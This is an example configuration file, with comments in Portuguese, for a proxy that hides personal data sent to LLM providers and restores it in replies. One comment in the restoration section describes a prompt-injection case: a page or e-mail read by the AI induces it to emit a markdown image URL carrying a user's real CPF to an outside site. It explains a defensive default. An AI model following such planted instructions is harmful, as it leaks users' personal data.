# Exemplo completo de configuração do Véu. Copie para a pasta onde roda o "veu servir"
# (ou aponte VEU_CONFIG para ele) e apague o que não precisar: todas as opções têm padrão.

[deteccao]
# Cache de detecção de textos longos (itens; 0 desliga). Guarda só posições e tipos, nunca o texto.
cache = 2048
# Pontuação mínima de 0 a 1. O padrão 0,5 também esconde valores com formato de documento
# mas dígitos verificadores errados (provável erro de digitação). Use 0,6 para exigir validade.
limiar = 0.5

# Vazio = todos os tipos. Veja a lista com "veu entidades".
entidades = []

# Valores que nunca são escondidos: dados da própria empresa, contatos públicos.
ignorar = ["contato@minhaempresa.example", "11.222.333/0001-81"]
# Expressões regulares: valores que casarem também nunca são escondidos.
ignorar_padroes = ['@minhaempresa\.example$', '^0800']

# Detectores ligados: padroes, nomes, enderecos, segredos (chaves de API, tokens, senhas), spacy, llm,
# ml (modelo BERT de nomes em português, pip install "veu[ml]"),
# um plugin instalado ("matricula")
# ou um caminho de importação ("meu_pacote.detectores:MeuDetector").
detectores = ["padroes", "nomes", "enderecos", "segredos"]
modelo_spacy = "pt_core_news_lg"
modelo_ml = "linc42/pii-ner-pt-br-bertimbau"

# Padrões próprios.
[[deteccao.personalizados]]
entidade = "MATRICULA"
padrao = "MAT-\\d{6}"
pontuacao = 0.9
contexto = ["matrícula", "matricula"]
exige_contexto = false

# Detector por IA local (só com o detector "llm" ligado). Use um modelo local:
# o texto original é enviado a este endereço.
[deteccao.llm]
url = "http://localhost:11434/v1"
modelo = "qwen2.5:7b"

[anonimizacao]
# token | sintetico | mascara | remover | hash
operador = "token"
# Avisa o modelo para repetir os marcadores sem tentar adivinhar os valores.
instruir_modelo = true
# "João" sozinho recebe o mesmo marcador de "João da Silva".
vincular_nomes = true
# Variável de ambiente com o segredo do operador hash (marcadores estáveis entre requisições).
# Mínimo de 32 caracteres: python -c "import secrets; print(secrets.token_urlsafe(32))"
segredo_env = "VEU_SEGREDO"

[anonimizacao.operadores]
CARTAO_CREDITO = "remover"
DATA_NASCIMENTO = "mascara"

[restauracao]
# Restaurar os dados reais dentro de links, imagens e URLs. Desligado: uma página ou e-mail lido pela IA
# pode induzi-la a escrever ![x](https://site/?d=[CPF_1]), e o navegador enviaria o CPF real ao site.
links = false
# Exceções: links destes domínios (e subdomínios) recebem os dados reais.
dominios_links = []
# Restaurar os argumentos das chamadas de ferramenta (o que um agente vai executar).
ferramentas = true
# Restaurar chaves de API, tokens e senhas nesses argumentos.
segredos_em_ferramentas = false

[politica]
# Perfil pronto: pseudonimizacao (padrão), anonimizacao, judiciario, juridico, saude, financeiro ou
# setor-publico (veja: veu perfis). As opções escritas aqui valem mais que as do perfil.
perfil = "pseudonimizacao"
# Tipos que fazem a requisição ser recusada em vez de só escondida.
bloquear = ["CHAVE_PRIVADA"]
# Desvio: requisições com estes tipos vão inteiras para um provedor interno (vazio = qualquer dado pessoal).
# desviar_para = "interno"
# modelo_desvio = "llama3.1:70b"
# desviar_tipos = ["CPF", "CARTAO_CREDITO"]
# "bloquear" (padrão) ou "repassar" os POST para endpoints que o Véu não sabe proteger.
endpoints_desconhecidos = "bloquear"

[servidor]
host = "127.0.0.1"
porta = 8787
provedor_padrao = "openai"
playground = true
# Uma linha JSON por requisição, só com contagens.
log_auditoria = "veu-auditoria.jsonl"
sessao_ttl = 3600
# Usa as chaves das variáveis de ambiente do servidor quando o cliente não envia nenhuma.
injetar_chaves = false
timeout = 600
# Variável de ambiente com o token exigido no cabeçalho X-Veu-Token (recomendado fora do localhost).
token_env = "VEU_TOKEN"
# Fora do localhost o servidor não inicia sem token. Libere só numa rede interna isolada.
permitir_sem_token = false
# Tamanho máximo do corpo de cada requisição, em MB.
limite_corpo_mb = 20
# Aceita o cabeçalho X-Veu-Operador para escolher o operador por requisição.
operador_por_requisicao = true
# Expõe /veu/metricas no formato do Prometheus.
metricas = true
# Lê links do Notion e do Google enviados nas mensagens e manda o conteúdo já protegido (NOTION_TOKEN no ambiente).
expandir_links = false
dominios_expandidos = ["notion.so", "notion.com", "notion.site", "docs.google.com"]
# "memoria" ou uma URL redis:// (várias réplicas compartilhando as sessões; o Redis guarda dados reais).
sessoes = "memoria"
# Com segredo, cada linha da auditoria leva um HMAC encadeado. Confira com: veu auditoria verificar arquivo.jsonl
# segredo_auditoria_env = "VEU_SEGREDO_AUDITORIA"

# Equipes: cada uma com o próprio token (no cabeçalho X-Veu-Token) e, se quiser, a própria política.
# [equipes.juridico]
# token_env = "VEU_TOKEN_JURIDICO"
# bloquear = ["CARTAO_CREDITO"]
# operador = "sintetico"

# Provedor próprio: acessível em http://127.0.0.1:8787/interno/v1
[provedores.interno]
tipo = "openai"                      # openai, anthropic, gemini ou ollama
url = "https://ia.minhaempresa.example/v1"
chave_env = "IA_INTERNA_KEY"

# Regras por provedor (vale também para os que já vêm prontos, sem repetir a url).
[provedores.ollama]
anonimizar = false                   # modelo local: os dados não saem da máquina

[provedores.openrouter]
operador = "sintetico"
bloquear = ["CARTAO_CREDITO"]
